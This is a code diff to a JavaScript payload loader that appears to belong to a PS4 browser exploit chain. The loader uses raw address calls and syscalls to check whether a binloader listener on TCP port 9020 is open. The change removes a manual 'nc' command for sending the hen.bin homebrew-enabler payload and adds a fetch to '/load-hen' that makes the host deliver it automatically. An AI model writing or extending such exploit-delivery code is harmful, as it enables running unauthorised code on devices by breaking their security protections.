@@ -1931,8 +1931,23 @@ async function loadPayload(url, patches, vorab) {
         const prc = c.callAddr(plus(entry, scratch), [pfd, sa.at, 16]).i32;
         sc(S.close, pfd);
         if (prc === 0) {
-          say("[p] binloader: TCP 9020 on this console is OPEN -- send a payload now and close the conn:");
-          say("[p]   nc -q0 <PS4-IP> 9020 < hen.bin       (raw e9 payloads only, max 8 MB)");
+          say("[p] binloader: TCP 9020 is OPEN -- requesting automatic hen.bin delivery from host");
+          try {
+            const response = await fetch("/load-hen", {
+              method: "GET",
+              credentials: "same-origin",
+              cache: "no-store"
+            });
+            const result = await response.text();
+            if (response.ok) {
+              say("[p] HEN: " + result);
+            } else {
+              say("[p] HEN: DELIVERY FAILED (" + response.status + "): " + result);
+            }
+          } catch (sendError) {
+            say("[p] HEN: host delivery request failed (" +
+                (sendError && sendError.message ? sendError.message : sendError) + ")");
+          }
         } else {
           say("[p] binloader: probe connect rc=" + prc + " -- listener NOT reachable (stub died? check banner)");
         }
